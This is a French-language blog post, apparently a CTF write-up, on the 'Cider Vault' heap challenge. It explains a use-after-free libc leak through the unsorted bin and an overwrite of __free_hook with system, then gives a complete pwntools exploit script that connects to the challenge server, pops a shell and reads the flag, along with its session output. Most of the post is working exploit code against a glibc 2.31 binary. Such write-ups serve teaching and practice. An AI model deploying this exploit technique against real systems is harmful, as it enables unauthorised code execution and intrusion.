---
layout: post
title: "Challenge Cider Vault, bitskrieg"
date: 2026-02-22 12:00:00 +0100
categories: CTF
---

[https://ctf.bitskrieg.in/challenges#Cider%20Vault-6](https://ctf.bitskrieg.in/challenges#Cider%20Vault-6)
[https://bitskrieg.in/](https://bitskrieg.in/)

Un challenge qui part comment une exploitation de heap, en plus facile.
Sous pretexte de modifier un livre, on peut :
- allouer un bloc d'une taille arbitraire
- lire et modifier son contenu
- écraser le pointeur d'un bloc par une valeur arbitraire
- et quelques actions inutiles

La cible, `cider_vault`, a toutes les protections.
Heureusement la libc est ancienne ; 2.31.

J'utilise pwninit pour patcher le binaire afin qu'il utilise la bonne libc en local.

Au vu des fonctions parfaites, pas besoin de partir sur une heap exploitation.

Projet:
- utiliser un UAF pour obtenir un leak vers la libc.
- écraser `__free_hook` avec system.
- allouer et libérer un bloc avec `/bin/sh`.

Le trick à connaitre est qu'en libérant une chunk de >0x408 bytes, il va dans l'unsorted bin.
Et là il contient le pointeur vers le chunk précédant et suivant, vers libc si il n'y en a pas d'autres.
Pas de protections type tcache key ou safe linking.
Au moment du `free()` il faut un autre bloc alloué après pour ne pas que le bloc libéré fusionne avec le next ou disparaisse.

```bash
➜  cidervault ./exploit.py REMOTE
[+] Opening connection to chals.bitskrieg.in on port 29681: Done
[+] heapbase: 0x5555683ca000
[+] libc.address: 0x7fdb37f7a000
[*] Switching to interactive mode
Linux 198894adfd5f 6.1.0-43-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64 x86_64 x86_64 GNU/Linux
BITSCTF{d360051fd32e516f7d6db018af8c6e65}
$ 
```

 \- mandragore, 2026/02/22

```python
#!/usr/bin/env python3

from pwn import *
import re
import sys
import os
# sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'amd64'

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./cider_vault_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    p = remote('chals.bitskrieg.in', 29681)
else:
    if args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
            continue
        ''')
    else:
        p = process(elf.path)

defchunksize=500

def alloc(idx,size=defchunksize):
    p.sendline(b'1')
    p.sendlineafter(b'page id:\n',str(idx).encode())
    p.sendlineafter(b'page size:\n',str(size).encode())
    ret=p.recvuntil(b'> \n')
    assert ret[0:2]!=b'no','alloc failed'

def edit(idx,data):
    p.sendline(b'2')
    p.sendlineafter(b'page id:\n',str(idx).encode())
    p.sendlineafter(b'ink bytes:\n',str(len(data)).encode())
    p.sendlineafter(b'ink:\n',data)
    p.recvuntil(b'> \n')

def leak(idx,size=defchunksize):
    p.sendline(b'3')
    p.sendlineafter(b'page id:\n',str(idx).encode())
    p.sendlineafter(b'peek bytes:\n',str(size).encode())
    return p.recvuntil(b'> \n')

def free(idx,shouldwait=True):
    p.sendline(b'4')
    p.sendlineafter(b'page id:\n',str(idx).encode())
    if shouldwait:
        p.recvuntil(b'> \n')

def exactptr(idx,val):
    val^=0x51f0d1ce6e5b7a91
    p.sendline(b'6')
    p.sendlineafter(b'page id:\n',str(idx).encode())
    p.sendlineafter(b'star token:\n',str(val).encode())
    p.recvuntil(b'> \n')

p.recvuntil(b'> \n')

alloc(1,0x450)  
alloc(2)        # don't fusion
free(1)         # unsorted bin

leakdata=leak(1)
libc.address=u64(leakdata[0:8])-0x1ecbe0
log.success(f'libc.address: {libc.address:#x}')

what=libc.sym.system
where=libc.sym.__free_hook

exactptr(2,where)
edit(2,p64(what))
alloc(3)
edit(3,b'/bin/sh\0')
free(3,shouldwait=False)

p.sendline(b'uname -a;cat flag.txt')
p.interactive()
```
